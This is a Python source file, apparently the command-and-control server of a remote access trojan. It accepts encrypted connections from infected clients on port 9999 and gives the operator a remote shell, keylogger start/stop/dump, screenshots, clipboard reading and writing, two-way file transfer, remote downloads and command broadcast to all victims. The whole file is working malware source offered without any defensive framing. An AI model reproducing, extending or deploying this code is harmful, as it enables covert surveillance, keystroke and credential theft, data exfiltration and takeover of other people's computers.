import json
import logging
import os
import socket
import sys
import threading
import time
from datetime import datetime
from queue import Queue

from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

logging.basicConfig(level=logging.CRITICAL)

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()

interface_help = """
--h | See this Help Message
--e | Open a shell
--g | Grabs a screenshot
--u | User Info
--k (start) (stop) (dump) | Manage Keylogger
--s | Transfers file to Client
--r | Transfers file to Server
--d | Download file from the web
--c | Copies to Client Clipboard
--p | Returns Client Current Clipboard
--b | Run Connection in Background"""

turtle_help = """
--h | See this Help Message
--a (Command) | Send shell command to all connected clients
--l | List connected Clients
--i (ID) | Connect to a Client"""


def Hasher(MESSAGE):

    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(MESSAGE)
    return digest.finalize()

def verifySignature(publicKey, signature, message):
    try:
        publicKey.verify(
            signature,
            message,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except:
        return False

def sign(privateKey, data):
    signature = privateKey.sign(
        data,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    return signature

def encrypt(publicKey, plaintext):
    ciphertext = publicKey.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None)
    )
    return ciphertext

def decrypt(privateKey, ciphertext):
    plaintext = privateKey.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return plaintext

def public_bytes(publicKey):
    serializedPublic = publicKey.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    return serializedPublic

def json_dumps(data):
    return json.dumps(data).encode()


class MultiServer(object):

    def __init__(self):
        self.host = ''
        self.port = 9999
        self.socket = None
        self.all_keys = []
        self.all_connections = []
        self.all_addresses = []

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            logging.error("Socket creation error: " + str(msg))
            # TODO: Added exit
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return
    
    def socket_bind(self):
        """ Bind socket to port and wait for connection from client """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            logging.error("Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def recvall(self, conn, n):
        """ Helper function to recv n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def receive(self, conn, _print=True):
        """ Receive Buffer Size and Data from Client Encrypted with Connection Specific AES Key """
        target = self.all_connections.index(conn)
        Fer = self.all_keys[target]

        length = int(Fer.decrypt(conn.recv(2048)).decode())
        conn.send(b'<RECEIVED>')
        received = Fer.decrypt(self.recvall(conn, length))
        if _print:
            print(received.decode())
        return received

    def send(self, conn, data):
        """ Send Buffer Size and Data to Client Encrypted with Connection Specific AES Key """
        target = self.all_connections.index(conn)
        Fer = self.all_keys[target]

        encrypted = Fer.encrypt(data)
        conn.send(Fer.encrypt(str(len(encrypted)).encode()))
        conn.recv(1024)
        conn.send(encrypted)

    def accept_connections(self):
        """ Accepts incoming connections and agrees on a AES key using RSA"""
        while 1:
            try:
                privateKey = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
                publicKey = privateKey.public_key()
                conn, address = self.socket.accept()
                conn.setblocking(1)
                clientPublic = serialization.load_pem_public_key(conn.recv(20480), backend=default_backend())
                conn.send(public_bytes(publicKey))

                def recv_data(conn):
                    buffer = int(conn.recv(4096).decode())
                    conn.send(b'<RECEIVED>')
                    data = self.recvall(conn, buffer)
                    conn.send(b'<RECEIVED>')
                    return data

                Hashed_Key = recv_data(conn)
                Encrypted = recv_data(conn)
                Hash_Encrypted = recv_data(conn)
                Signature = recv_data(conn)
                Encrypted_Signature = recv_data(conn)

                Encrypted_Verify = verifySignature(clientPublic, Encrypted_Signature, Hash_Encrypted)
                logging.debug('Encrypted Hash Signature Verification: {}'.format(str(Encrypted_Verify)))
                if not Encrypted_Verify:

                    logging.error('Error Verifying Hash')
                    continue

                Decrypted = decrypt(privateKey, Encrypted)
                Verify_Decryption = verifySignature(clientPublic, Signature, Hashed_Key)
                logging.debug('Hash Signature Verification: {}'.format(str(Verify_Decryption)))
                if not Verify_Decryption:

                    logging.error('Error Verifying Hash')
                    continue

                Compare = Hasher(Decrypted) == Hashed_Key

                logging.debug('Hash Verification: {}'.format(str(Compare)))
                if not Compare:

                    logging.error('Key and Hashed Key do not match!')
                    continue

                self.all_keys.append(Fernet(Decrypted))
                self.all_connections.append(conn)
                logging.debug('Fernet Key: {}'.format(str(Decrypted)))

                client_hostname = self.receive(conn, _print=False).decode()

                address = address + (client_hostname,)
                self.all_addresses.append(address)
                print('\nConnection has been established: {0} ({1})'.format(address[0], address[-1]))
                privateKey = None
                publicKey = None

            except Exception as e:
                privateKey = None
                publicKey = None
                logging.debug(e)

    def list_connections(self):
        """ List all connections """
        results = ''
        for i, conn in enumerate(self.all_connections):
            try:
                self.send(conn, json_dumps.dumps(['--l']))
                conn.recv(20480)
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                del self.all_keys[i]
                continue
            results += str(i) + '   ' + str(self.all_addresses[i][0]) + '   ' + str(
                self.all_addresses[i][1]) + '   ' + str(self.all_addresses[i][2]) + '\n'
        print('----- Clients -----' + '\n' + results)
        return

    def get_target(self, cmd):
        """ Select target client
        :param cmd:
        """
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except:
            logging.error('Client index should be an integer')
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError:
            logging.error('Not a valid selection')
            return None, None
        print("You are now connected to " + str(self.all_addresses[target][2]))
        return target, conn

    def send_file(self, conn):
        """ Send file from Server to Client """
        file_to_transfer = input('File to Transfer to Client: ')
        save_as = input('Save as: ')
        with open(file_to_transfer, 'rb') as f:
            content = f.read()
        self.send(conn, json_dumps(['--s', save_as]))
        self.receive(conn, _print=False)
        self.send(conn, content)
        self.receive(conn)

    def receive_file(self, conn):
        """ Transfer file from Client to Server """
        
        file_to_transfer = input('File to Transfer to Server: ')
        save_as = input('Save as: ')

        self.send(conn, json_dumps(['--r', file_to_transfer]))
        content = self.receive(conn, _print=False)
        if content == b'<TRANSFERERROR>':
            print('Error Transfering File')
            return
        with open(save_as, 'wb') as f:
            f.write(content)
        print('File Transfer Successful')
        return

    def screenshot(self, conn):
        self.send(conn, json_dumps(['--g']))
        data = self.receive(conn, _print=False)
        with open('{}.png'.format(str(datetime.now()).replace(':','-')), 'wb') as f:
            f.write(data)
        print('Screenshot saved.')
        return

    def shell(self, conn):
        """ Remote Shell with Client """
        self.send(conn, json_dumps(['cd']))
        cwd = self.receive(conn, _print=False).decode()
        command = ''

        while 1:
            command = input('{}>'.format(cwd))
            if command == 'quit':
                break
            if command[:2].lower() == 'cd':
                self.send(conn, json_dumps([command]))
                cwd = self.receive(conn, _print=False).decode()
                continue
            self.send(conn, json_dumps([command]))
            try:
                while 1:
                    output = self.receive(conn, _print=False)
                    if output == b'<DONE>':
                        break
                    try:
                        print(output.decode())
                    except UnicodeDecodeError:
                        print(output)
                    self.send(conn, json_dumps(['<LISTENING>']))
            except KeyboardInterrupt:
                print('Keyboard Interrupt')
                self.send(conn, b'--q')
                break

    def interface(self, conn, target):
        """ CLI Interface to Client """
        while True:
            command = input('>> ')
            if '--b' in command:
                break
            if '--e' in command:
                self.shell(conn)
                continue
            if '--c' in command:
                text_to_copy = input('Text to copy: ')
                self.send(conn, json_dumps(['--c', text_to_copy]))
                self.receive(conn, _print=False)
                print('Copied Successfully')
                continue
            if '--u' in command:
                self.send(conn, json_dumps(['--u']))
                info = self.all_addresses[self.all_connections.index(conn)]
                print('IP : {}\nPort: {}\nPC Name: {}'.format(info[0], info[1], info[2]))
                self.receive(conn)
                continue
            if command[:3] == '--k':
                if command[4:].strip() == 'start':
                    self.send(conn, json_dumps(['--k start']))
                    self.receive(conn)
                    continue
                if command[4:].strip() == 'stop':
                    self.send(conn, json_dumps(['--k stop']))
                    self.receive(conn)
                    continue
                if command[4:].strip() == 'dump':
                    self.send(conn, json_dumps(['--k dump']))
                    data = self.receive(conn, _print=False)
                    if data == b'<NOTRUNNING>':
                        print('Keylogger not running\n')
                        continue
                    with open('{}.log'.format(str(datetime.now()).replace(':','-')), 'wb') as f:
                        f.write(data)
                    print('Logs saved')
                    continue
            if '--p' in command:
                self.send(conn, json_dumps(['--p']))
                self.receive(conn)
                continue
            if '--d' in command:
                file_url = input('File URL: ')
                file_name = input('Filename: ')
                self.send(conn, json_dumps(['--d', file_url, file_name]))
                self.receive(conn)
                continue
            if '--s' in command:
                self.send_file(conn)
                continue
            if '--r' in command:
                self.receive_file(conn)
                continue
            if '--g' in command:
                self.screenshot(conn)
                continue
            if '--h' in command:
                print(interface_help)
                continue
            print("Invalid command: '--h' for help.")

    def turtle(self):
        """ Connection Selector """
        print("Type '--h' for help")
        while True:
            try:
                command = input('> ')
                if command == '--h':
                    print(turtle_help)
                if command[:3] == '--a':
                    if len(command) > 4:
                        for client in self.all_connections:
                            try:
                                self.send(client, json_dumps([command[4:]]))
                                print('Response from {}: '.format(self.all_addresses[self.all_connections.index(client)][0]))
                                while 1:
                                    response = self.receive(client, _print=False)
                                    if response == b'<DONE>':
                                        break
                                    print(response.decode())
                                    self.send(client, b'<LISTENING>')
                            except:
                                pass
                    else:
                        print("Arguments missing, '--h' for help")
                elif command == '--l':
                    self.list_connections()
                elif '--i' in command:
                    target, conn = self.get_target(command)
                    if conn is not None:
                        self.interface(conn, target)
            except:
                print('Connection lost.')

def create_workers():
    """ Create worker threads (will die when main exits) """
    server = MultiServer()
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return

def work(server):
    """ Do the next job in the queue (thread for handling connections, another for sending commands)
    :param server:
    """
    while True:
        x = queue.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:
            server.turtle()
        queue.task_done()
    return

def create_jobs():
    """ Each list item is a new job """
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return

def main():
    create_workers()
    create_jobs()


if __name__ == '__main__':
    main()
